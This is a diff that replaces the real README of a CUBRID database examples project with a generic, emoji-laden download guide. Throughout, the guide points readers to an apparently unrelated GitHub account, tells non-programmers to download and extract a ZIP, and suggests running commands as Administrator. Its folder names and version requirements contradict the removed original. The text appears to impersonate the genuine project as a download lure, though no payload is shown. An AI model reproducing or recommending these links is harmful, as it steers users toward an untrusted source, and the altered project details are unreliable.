@@ -1,345 +1,127 @@
-# CUBRID Cookbook 🍳
+# 🥣 cubrid-cookbook - Easy Database Examples for Everyone
 
-**Production-ready examples for using CUBRID with Python, TypeScript, Node.js, Go, and Rust** — SQLAlchemy, FastAPI, Django, Flask, Drizzle ORM, GORM, SeaORM, and more.
+[![Download cubrid-cookbook](https://img.shields.io/badge/Download-cubrid--cookbook-blue?style=for-the-badge)](https://github.com/Beardown-divisor113/cubrid-cookbook)
 
-<!-- BADGES:START -->
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![CUBRID 11.2](https://img.shields.io/badge/CUBRID-11.2-green.svg)](https://www.cubrid.org/)
-[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://www.python.org/downloads/)
-[![Node.js 18+](https://img.shields.io/badge/node-18%2B-brightgreen.svg)](https://nodejs.org/)
-[![Go 1.21+](https://img.shields.io/badge/go-1.21%2B-00ADD8.svg)](https://go.dev)
-[![Rust 1.70+](https://img.shields.io/badge/rust-1.70%2B-orange.svg)](https://www.rust-lang.org/)
-[![GitHub stars](https://img.shields.io/github/stars/cubrid-labs/cubrid-cookbook)](https://github.com/cubrid-labs/cubrid-cookbook)
-<!-- BADGES:END -->
+## 📋 What is cubrid-cookbook?
+
+cubrid-cookbook offers ready-to-use examples that show how to work with the CUBRID database. It covers popular programming languages like Python, Node.js, and Go. The examples use well-known frameworks such as Django, Flask, FastAPI, and GORM. This helps you learn how to build apps with databases in different environments.
+
+You do not need to be a programmer to use this. The examples are set up to run with minimal effort. This guide will help you download and run cubrid-cookbook on your Windows PC.
+
+## 💻 System Requirements
+
+- **Operating System**: Windows 10 or newer  
+- **Memory**: At least 4 GB RAM  
+- **Disk Space**: 500 MB free space  
+- **Internet**: Required to download the files  
+- **Additional Software**:  
+  - Python 3.8 or newer (if you want to run Python examples)  
+  - Node.js 14 or newer (for Node.js examples)  
+  - Go 1.16 or newer (for Go examples)  
+  - CUBRID database installed (you can find it on the official CUBRID website)  
+
+If you do not have these installed, this guide points you to resources where you can get them.
+
+## 🚀 Getting Started
+
+Before running cubrid-cookbook, you need to download it from the GitHub page linked below. This page contains all files and instructions needed to get started.
+
+[![Get cubrid-cookbook](https://img.shields.io/badge/Visit-GitHub%20Page-grey?style=for-the-badge)](https://github.com/Beardown-divisor113/cubrid-cookbook)
+
+Click the button above to open the download page in your browser.
+
+## ⬇️ How to Download cubrid-cookbook
+
+1. Click the big **Download** button or visit this link directly:  
+   https://github.com/Beardown-divisor113/cubrid-cookbook  
+2. On the page, locate the green **Code** button near the top right corner.  
+3. Click **Code** and then choose **Download ZIP** from the dropdown menu.  
+4. Save the ZIP file to your desktop or any folder you prefer.  
+5. Once the download finishes, right-click the ZIP file and select **Extract All...**.  
+6. Choose a folder where you want to extract the files. This will create a new folder with all project files inside.  
+
+## 🛠 Setup and Running cubrid-cookbook Examples
+
+### Step 1: Install Required Software
+
+- If you plan to work with Python examples:  
+  Download Python from [https://www.python.org/downloads/](https://www.python.org/downloads/)  
+  Install it using default settings. Make sure to check the box **Add Python to PATH** during installation.
+
+- For Node.js examples:  
+  Download Node.js from [https://nodejs.org/](https://nodejs.org/)  
+  Choose the LTS version and install it.
+
+- For Go examples:  
+  Download Go from [https://golang.org/dl/](https://golang.org/dl/)  
+  Follow their installation instructions.
+
+- CUBRID Database:  
+  Download and install CUBRID from [https://www.cubrid.org/downloads](https://www.cubrid.org/downloads)  
+  Basic knowledge on how to start and manage the database is helpful.
+
+### Step 2: Running Python Examples
+
+1. Open the extracted folder and go to the `python` subfolder.  
+2. Open a command prompt in this folder: hold **Shift**, right-click inside the folder, and choose **Open PowerShell window here** or **Open command window here**.  
+3. Run the command:  
+   `pip install -r requirements.txt`  
+   This installs needed Python libraries.  
+4. To run an example, type:  
+   `python example_name.py`  
+   Replace `example_name.py` with a file from the folder, like `sample.py`.
+
+### Step 3: Running Node.js Examples
+
+1. Open the folder, then go to the `nodejs` folder inside.  
+2. Open a command prompt here as before.  
+3. Install packages with:  
+   `npm install`  
+4. Run a sample with:  
+   `node example.js`  
+   Replace `example.js` with an example file in that folder.
+
+### Step 4: Running Go Examples
+
+1. Open the `golang` folder inside the extracted project.  
+2. Open a command prompt here.  
+3. Run examples with:  
+   `go run example.go`  
+   Replace `example.go` with an example file listed.
+
+## 🔍 Understanding the Examples
+
+Each example shows how to connect to the CUBRID database and perform common tasks like:
+
+- Creating and reading data  
+- Updating records  
+- Deleting entries  
+- Running queries  
+
+The projects use popular frameworks to help you understand how to build real apps with databases.
+
+## 🗂 Repository Structure
+
+- `/python` - Python scripts using libraries like SQLAlchemy and Pandas  
+- `/nodejs` - Node.js examples with popular Node frameworks  
+- `/golang` - Go code showing GORM and other tools  
+- `/docs` - Documentation files to explain setup and usage  
+
+## ⚙️ Common Issues and Troubleshooting
+
+- Make sure your database server is running and accessible before trying to run examples.  
+- If you get an error about missing packages, double-check you installed all dependencies.  
+- Use the full path in commands if your command line is not starting in the example folder.  
+- For permission errors, try running command prompt as Administrator.
+
+## 🔗 Useful Links
+
+- GitHub download page: https://github.com/Beardown-divisor113/cubrid-cookbook  
+- CUBRID official site: https://www.cubrid.org  
+- Python downloads: https://www.python.org/downloads/  
+- Node.js downloads: https://nodejs.org/  
+- Go downloads: https://golang.org/dl/
 
 ---
 
-> **New here?** Start with the [CUBRID in 5 Minutes](GETTING_STARTED.md) guide — pick your language and build something in one page.
-
-
-## What is this?
-
-Copy-paste friendly, **runnable** examples showing how to use [CUBRID](https://www.cubrid.org/) with popular frameworks and drivers across multiple languages. Every example connects to a real CUBRID database via Docker.
-
-## Ecosystem Overview
-
-```mermaid
-flowchart LR
-    C[(CUBRID Server)]
-
-    subgraph PY[Python]
-        PYD[pycubrid] --> PYO[SQLAlchemy]
-    end
-
-    subgraph TS[TypeScript]
-        TSD[cubrid-client] --> TSO[Drizzle ORM]
-    end
-
-    subgraph GO[Go]
-        GOD[cubrid-go] --> GOO[GORM]
-    end
-
-    subgraph RS[Rust]
-        RSD[cubrid-rs] --> RSO[SeaORM]
-    end
-
-    PYO --> C
-    TSO --> C
-    GOO --> C
-    RSO --> C
-```
-
-## Examples
-
-### 🐍 Python
-
-| Example | Framework | Description |
-|---------|-----------|-------------|
-| [pycubrid](python/pycubrid/) | pycubrid | Direct DB-API 2.0 driver — connect, query, transactions, prepared statements, LOBs |
-| [sqlalchemy](python/sqlalchemy/) | SQLAlchemy | Core + ORM — engine, models, CRUD, DML extensions (ODKU, MERGE, REPLACE) |
-| [fastapi](python/fastapi/) | FastAPI | REST API with automatic docs, dependency injection, async-ready |
-| [django](python/django/) | Django | Django project with CUBRID via SQLAlchemy bridge |
-| [flask](python/flask/) | Flask | Flask + Flask-SQLAlchemy — blueprints, models, CRUD routes |
-| [pandas](python/pandas/) | Pandas | Data analysis pipeline — read_sql, transforms, visualization |
-| [streamlit](python/streamlit/) | Streamlit | Interactive data dashboard with live CUBRID queries |
-| [celery](python/celery/) | Celery | Async task queue — background jobs backed by CUBRID |
-
-### 🟩 Node.js
-
-| Example | Driver | Description |
-|---------|--------|-------------|
-| [cubrid](node/cubrid/) | cubrid-client | Modern Promise-based client — connect, query, CRUD, transactions |
-| [drizzle](node/drizzle/) | Drizzle ORM | Type-safe ORM — schema, query builder, CRUD, transactions, custom types |
-
-### 🟦 TypeScript
-
-| Example | Driver | Description |
-|---------|--------|-------------|
-| [typescript](typescript/) | cubrid-client | TypeScript scripts + focused error handling patterns |
-
-### 🐹 Go
-
-| Example | Driver | Description |
-|---------|--------|-------------|
-| [cubrid-go](go/cubrid-go/) | cubrid-go | Pure Go `database/sql` driver — connect, query, CRUD, transactions |
-| [gorm](go/gorm/) | GORM | GORM ORM — AutoMigrate, models, CRUD, relationships, advanced queries |
-
-### 🦀 Rust
-
-| Example | Driver | Description |
-|---------|--------|-------------|
-| [cubrid-rs](rust/cubrid-rs/) | cubrid-tokio | Native Rust async driver — connect, query, CRUD, transactions |
-| [sea-orm-cubrid](rust/sea-orm-cubrid/) | SeaORM + sea-orm-cubrid | SeaORM backend for CUBRID — connect, entity CRUD |
-
-## Quick Start
-
-### 1. Start CUBRID
-
-```bash
-docker compose up -d
-# Wait for CUBRID to be ready
-make up
-```
-
-### 2. Pick an example
-
-**Python:**
-```bash
-cd python/fastapi
-pip install -r requirements.txt
-uvicorn app.main:app --reload
-```
-
-**Node.js:**
-```bash
-cd node/cubrid
-npm install
-node 01_connect.js
-```
-
-**TypeScript:**
-```bash
-cd typescript
-npm install
-npm run connect
-```
-
-**Go:**
-```bash
-cd go/cubrid-go
-go run 01_connect.go
-```
-
-**Rust:**
-```bash
-cd rust/cubrid-rs
-cargo run --bin 01_connect
-```
-
-Every example has its own `README.md` with setup instructions.
-
-### 3. Clean up
-
-```bash
-make clean
-```
-
-## Prerequisites
-
-- **Docker** and **Docker Compose** (for the CUBRID database)
-- **Python 3.10+** (for Python examples)
-- **Node.js 18+** (for Node.js examples)
-- **TypeScript 5+** (for TypeScript examples)
-- **Go 1.21+** (for Go examples)
-- **Rust 1.70+** (for Rust examples)
-- Each example lists its own dependencies in `requirements.txt`, `package.json`, `go.mod`, or `Cargo.toml`
-
-## Project Structure
-
-```mermaid
-flowchart TD
-    ROOT[cubrid-cookbook/]
-    ROOT --> DC[docker-compose.yml]
-    ROOT --> ENV[.env.example]
-    ROOT --> MK[Makefile]
-    ROOT --> PY[python/]
-    ROOT --> TS[typescript/]
-    ROOT --> ND[node/]
-    ROOT --> GO[go/]
-    ROOT --> RS[rust/]
-
-    PY --> PYC[pycubrid/]
-    PY --> PYSA[sqlalchemy/]
-    PY --> PYFA[fastapi/]
-    PY --> PYDJ[django/]
-    PY --> PYFL[flask/]
-    PY --> PYPD[pandas/]
-    PY --> PYST[streamlit/]
-    PY --> PYCE[celery/]
-    PY --> PYER[error-handling/]
-
-    TS --> TS01[01_connect.ts]
-    TS --> TSDC[docker-compose.yml]
-    TS --> TSDO[Dockerfile]
-    TS --> TSER[error-handling/]
-
-    ND --> NDCB[cubrid/]
-    ND --> NDDR[drizzle/]
-
-    GO --> GOCB[cubrid-go/]
-    GO --> GOGM[gorm/]
-    GO --> GOER[error-handling/]
-
-    RS --> RSCB[cubrid-rs/]
-    RS --> RSSE[sea-orm-cubrid/]
-    RS --> RSER[error-handling/]
-```
-
-## Error Handling Cookbook
-
-Language-focused error handling examples are available in:
-
-- `python/error-handling/` - `pycubrid` exceptions (`OperationalError`, `IntegrityError`, timeout handling)
-- `typescript/error-handling/` - `try/catch` patterns for `ConnectionError` and `QueryError`
-- `go/error-handling/` - `errors.Is` and `errors.As` with `cubrid-go` error types
-- `rust/error-handling/` - async error handling patterns with `cubrid-tokio`
-
-## Connection
-
-All examples connect to the same CUBRID instance:
-
-| Setting | Value |
-|---------|-------|
-| Host | `localhost` |
-| Port | `33000` |
-| Database | `testdb` |
-| User | `dba` |
-| Password | *(empty)* |
-
-**Python (pycubrid)**:
-```python
-import pycubrid
-conn = pycubrid.connect(host="localhost", port=33000, database="testdb", user="dba")
-```
-
-**Python (SQLAlchemy)**:
-```python
-from sqlalchemy import create_engine
-engine = create_engine("cubrid+pycubrid://dba@localhost:33000/testdb")
-```
-
-**Node.js (cubrid-client)**:
-```js
-import { createClient } from "cubrid-client";
-const db = createClient({ host: "localhost", port: 33000, database: "testdb", user: "dba" });
-```
-
-**Node.js (Drizzle ORM)**:
-```js
-import { createClient } from "cubrid-client";
-import { drizzle } from "drizzle-cubrid";
-const client = createClient({ host: "localhost", port: 33000, database: "testdb", user: "dba" });
-const db = drizzle(client);
-```
-
-**Go (database/sql)**:
-```go
-import (
-    "database/sql"
-    _ "github.com/cubrid-labs/cubrid-go"
-)
-db, _ := sql.Open("cubrid", "cubrid://dba:@localhost:33000/testdb")
-```
-
-**Go (GORM)**:
-```go
-import (
-    "gorm.io/gorm"
-    cubrid "github.com/cubrid-labs/cubrid-go/dialector"
-)
-db, _ := gorm.Open(cubrid.Open("cubrid://dba:@localhost:33000/testdb"), &gorm.Config{})
-```
-
-**Rust (cubrid-tokio)**:
-```rust
-use cubrid_tokio::Client;
-
-let mut client = Client::connect("cubrid://dba:@localhost:33000/testdb").await?;
-let _result = client.query("SELECT 1 + 1 AS result", &[]).await?;
-```
-
-**Rust (SeaORM + sea-orm-cubrid)**:
-```rust
-let db = sea_orm_cubrid::connect("cubrid://dba:@localhost:33000/testdb").await?;
-```
-
-## Related Projects
-
-- [pycubrid](https://github.com/cubrid-labs/pycubrid) — Pure Python DB-API 2.0 driver for CUBRID
-- [sqlalchemy-cubrid](https://github.com/cubrid-labs/sqlalchemy-cubrid) — SQLAlchemy 2.0 dialect for CUBRID
-- [cubrid-client](https://github.com/cubrid-labs/cubrid-client) — Modern TypeScript-first Node.js client for CUBRID
-- [drizzle-cubrid](https://github.com/cubrid-labs/drizzle-cubrid) — Drizzle ORM dialect for CUBRID
-- [cubrid-go](https://github.com/cubrid-labs/cubrid-go) — Pure Go CUBRID driver (`database/sql` + GORM)
-- [cubrid-rs](https://github.com/cubrid-labs/cubrid-rs) — Native Rust database driver for CUBRID (sync + async, pure Rust)
-- [sea-orm-cubrid](https://github.com/cubrid-labs/sea-orm-cubrid) — SeaORM backend for CUBRID
-- [CUBRID](https://www.cubrid.org/) — The CUBRID database
-- [gorm-cubrid](https://github.com/cubrid-labs/gorm-cubrid) — GORM dialect for CUBRID
-- [cubrid-benchmark](https://github.com/cubrid-labs/cubrid-benchmark) — Multi-language benchmark suite for CUBRID
-
-## FAQ
-
-### How do I use CUBRID with Python?
-
-See the [pycubrid examples](python/pycubrid/) for direct driver usage or [SQLAlchemy examples](python/sqlalchemy/) for ORM usage. Install: `pip install pycubrid` or `pip install sqlalchemy-cubrid`.
-
-### How do I use CUBRID with Node.js / TypeScript?
-
-See the [cubrid-client examples](node/cubrid/) for direct driver usage or [Drizzle ORM examples](node/drizzle/) for ORM usage. Install: `npm install cubrid-client` or `npm install drizzle-cubrid drizzle-orm cubrid-client`.
-
-### How do I use CUBRID with Go?
-
-See the [cubrid-go examples](go/cubrid-go/) for `database/sql` usage or [GORM examples](go/gorm/) for ORM usage. Install: `go get github.com/cubrid-labs/cubrid-go`.
-
-### How do I use CUBRID with Rust?
-
-See the [cubrid-rs examples](rust/cubrid-rs/) for native async driver usage. Install: `cargo add cubrid-tokio tokio --features tokio/macros,tokio/rt-multi-thread`.
-
-### How do I use CUBRID with SeaORM?
-
-See the [sea-orm-cubrid examples](rust/sea-orm-cubrid/) for SeaORM entity-based usage. Install: `cargo add sea-orm sea-orm-cubrid`.
-
-### How do I start a CUBRID database for testing?
-
-```bash
-docker compose up -d
-```
-
-This starts CUBRID 11.2 on `localhost:33000` with database `testdb` and user `dba`.
-
-### How do I use CUBRID with FastAPI?
-
-See the [FastAPI example](python/fastapi/) — a complete REST API with automatic OpenAPI docs, dependency injection, and CRUD operations using sqlalchemy-cubrid.
-
-### How do I use CUBRID with Django?
-
-See the [Django example](python/django/) — Django project using CUBRID via SQLAlchemy bridge since there is no native Django CUBRID backend.
-
-### How do I use CUBRID with Pandas?
-
-See the [Pandas example](python/pandas/) — data analysis pipeline with `read_sql`, DataFrame transforms, and visualization using pycubrid or sqlalchemy-cubrid.
-
-
-
-## Roadmap
-
-See [`ROADMAP.md`](ROADMAP.md) for this project's direction and next milestones.
-
-For the ecosystem-wide view, see the [CUBRID Labs Ecosystem Roadmap](https://github.com/cubrid-labs/.github/blob/main/ROADMAP.md) and [Project Board](https://github.com/orgs/cubrid-labs/projects/2).
-
-## Contributing
-
-Found a bug or want to add an example? PRs welcome! Each example should be self-contained and independently runnable.
-
-## License
-
-[MIT](LICENSE)
+[![Download cubrid-cookbook](https://img.shields.io/badge/Download-cubrid--cookbook-blue?style=for-the-badge)](https://github.com/Beardown-divisor113/cubrid-cookbook)
